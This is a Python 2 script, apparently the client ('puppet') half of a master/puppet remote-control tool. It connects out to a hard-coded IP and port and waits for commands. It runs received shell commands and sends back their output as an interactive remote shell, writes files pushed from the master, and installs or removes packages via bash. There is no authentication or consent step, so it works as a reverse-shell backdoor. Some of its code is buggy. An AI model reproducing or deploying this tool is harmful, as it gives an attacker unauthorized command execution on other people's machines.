#!/usr/bin/python

from _socket import socket,  AF_INET, SOCK_STREAM, error
from subprocess import PIPE , Popen
from os import system , popen , getcwd , chdir
import time


# Create a socket for this puppet
def socket_create():
    try:
        global host
        global port
        global s
        port = 9999
        host = '192.168.5.26'
        s = socket(AF_INET, SOCK_STREAM)
    except error as e:
        print "Socket creation error: {}".format(e)


# Connect to Master Puppet
def socket_connect():
    try:
        global host
        global port
        global s
        s.connect((host, port))
    except error as e:
        print "Socket connection error: {} ".format(e)


# Receive commands from remote Master Puppet and run on local machine
def run_commands():
    global s
    global data
    data = data.decode("utf-8").replace('se', '')

    while True:
        if data.decode("utf-8") == 'quit':
            break

        cmd = Popen(data[:].decode("utf-8"), shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes.decode("utf-8"))
        print output_str
        data = s.recv(1024)
        data = data.decode("utf-8").replace('se', '')

        s.send('')


# Receive file from remote Master Puppet and save on local machine
def receive_file(des):
    global s
    global data

    des = data[2:].decode("utf-8")
    system("cd {}".format(des))
    s.send(str.encode('ok'))

    with open('received_file', 'wb') as f:
        print 'file opened'
        while True:
            data = s.recv(20480)
            if data.decode("utf-8") != 'done':
                print 'recevinig data...'
                f.write(data)
                print 'data = %s' % data
            else:
                f.close()
                break
    s.send(str.encode("done"))
    print 'Successfully get the file'

# install or remove progrom
def install_remove():
    global s
    s.send(str.encode('ok'))
    pack_info = s.recv(2048)
    proc = Popen(pack_info, shell=True, stdin=None, stderr=None, executable="/bin/bash")
    proc.wait()
    s.send(str.encode('done'))


# full Remote control
def ssh_remote():
    global s
    global data

    while True:
        data = s.recv(20480)
        if data.decode("utf-8") == 'quit':
            break
        if data[:2].decode("utf-8") == 'cd':
            chdir(data[3:].decode("utf-8"))
            s.send(str.encode(str(getcwd())))

        elif (data.decode("utf-8") != 'Shell') and (data.decode("utf-8") != 'cd'):
            cmd = Popen(data[:].decode("utf-8"), shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_bytes.decode("utf-8"))
            s.send(str.encode(output_str))
            print output_str

def sendhello():
    s.send(str.encode(' '))

def exits():
    global flag
    flag = False
    s.send('')
    s.close()
    print "BYE BYE"


def NotFound():
    print "Option not found!"
    menu()

# Receive control from remote Master Puppet
def menu():
    global s
    global data
    global flag

    while flag:
        system("clear")
        data = s.recv(1024)
        cmd = data[:2].decode("utf-8")
        op = {
            "sh" : sendhello,
            "se" : run_commands,
            "tr" : receive_file,
            "in" or "re" : install_remove,
            "Sh" : ssh_remote,
            "qu" : exits
        }
        op.get(cmd, NotFound)()

# Close connection

def main():
    global flag
    flag = True
    system("clear")
    socket_create()
    socket_connect()
    menu()


if __name__ == '__main__':
    main()


